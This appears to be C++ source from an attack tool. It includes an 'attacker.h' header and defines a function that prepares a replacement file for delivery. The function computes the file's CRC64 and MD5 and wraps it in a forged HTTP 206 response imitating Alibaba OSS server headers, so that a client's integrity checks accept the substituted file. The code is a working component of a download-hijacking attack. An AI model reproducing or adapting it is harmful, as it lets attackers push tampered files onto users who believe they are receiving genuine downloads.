



#include <windows.h>
#include "Wgs2gcj.h"

#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "..\\cipher/Base64.h"
#include "../cipher/CryptoUtils.h"
#include "../FileOper.h"
using namespace std;











int Wgs2gcj::PrepareReplaceFile( string filename) {

	int ret = 0;

	string crc64 = CryptoUtils::FileCrc64( filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}

	char szmd5[64] = { 0 };

	unsigned char hexmd5[64] = { 0 };
	ret = CryptoUtils::getUpdateFileMd5(( filename), szmd5,hexmd5,FALSE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	this->m_filesize = 0;
	char * lpdata = 0;
	ret = FileOper::fileDecryptReader((filename).c_str(), &lpdata,&m_filesize);
	if (ret <= 0)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 206 Partial Content\r\n"
		
		"Server: Tengine/Aserver\r\n"
		"x-oss-server-time: 256\r\n"
		"Content-Type: application/octet-stream\r\n"
		
		"Content-Length: %u\r\n"
		
		"Connection: close\r\n"
		"x-oss-request-id: 5CDB7EF8CC2473C118B4F704\r\n"
		"Content-Range: bytes 0-%u/%u\r\n"
		"Accept-Ranges: bytes\r\n"
		"ETag: \"%s\"\r\n"

		"x-oss-object-type: Normal\r\n"

		
		"x-oss-hash-crc64ecma: %s\r\n"
		
		"x-oss-storage-class: Standard\r\n"

		"Timing-Allow-Origin: *\r\n"
		"Content-MD5: %s\r\n"
		
		"EagleEye-TraceId: 0b838cf115578887601108018ea5e6\r\n\r\n";



	m_lpdata = new char[m_filesize + MAX_RESPONSE_HEADER_SIZE];
	int httphdrlen = sprintf_s(m_lpdata, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, m_filesize, m_filesize - 1, m_filesize, 
		szmd5, crc64.c_str(), szbase64md5);

	memmove(m_lpdata + httphdrlen, lpdata, m_filesize);

	m_datasize = httphdrlen + m_filesize;
	return m_datasize;

}